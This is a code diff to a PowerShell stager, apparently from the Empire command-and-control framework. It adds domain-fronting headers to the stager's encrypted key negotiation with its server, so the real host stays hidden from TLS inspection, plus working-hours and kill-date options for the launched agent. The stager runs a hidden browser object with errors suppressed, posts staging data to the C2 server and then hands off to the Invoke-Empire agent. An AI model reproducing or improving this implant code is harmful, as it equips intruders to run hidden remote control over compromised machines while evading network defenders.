@@ -58,7 +58,7 @@ function Start-Negotiate {
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
     $e=[System.Text.Encoding]::ASCII;
-
+    $customHeaders = "";
     $SKB=$e.GetBytes($SK);
     # set up the AES/HMAC crypto
     # $SK -> staging key for this server
@@ -99,6 +99,15 @@ function Start-Negotiate {
         $ie.Silent = $True;
         $IE.visible = $False;
     }
+
+    if ($customHeaders -ne "") {
+        #If host header defined, assume domain fronting is in use and add a call to the base URL first
+	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+        if ($customHeaders.Contains("Host: ")) {
+                $IE.navigate2($s,14,0,$Null,$Null);
+                while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
+        }
+    }
     
     # RC4 routing packet:
     #   sessionID = $ID
@@ -113,7 +122,7 @@ function Start-Negotiate {
 
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
     $bytes=$e.GetBytes([System.Convert]::ToBase64String($rc4p));
-    $IE.navigate2($s+"/index.jsp", 14, 0, $bytes, $Null);
+    $IE.navigate2($s+"/index.jsp", 14, 0, $bytes, $customHeaders);
     while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
     $html = $IE.document.GetType().InvokeMember("body", [System.Reflection.BindingFlags]::GetProperty, $Null, $IE.document, $Null).InnerHtml;
 
@@ -183,7 +192,7 @@ function Start-Negotiate {
     $rc4p2 = $IV2 + $rc4p2 + $eb2;
 
     $bytes=$e.GetBytes([System.Convert]::ToBase64String($rc4p2));
-    $IE.navigate2($s+"/index.php", 14, 0, $bytes, $Null);
+    $IE.navigate2($s+"/index.php", 14, 0, $bytes, $customHeaders);
     while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
     $html = $IE.document.GetType().InvokeMember("body", [System.Reflection.BindingFlags]::GetProperty, $Null, $IE.document, $Null).InnerHtml;
     try {
@@ -199,7 +208,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID;
+    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE";
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
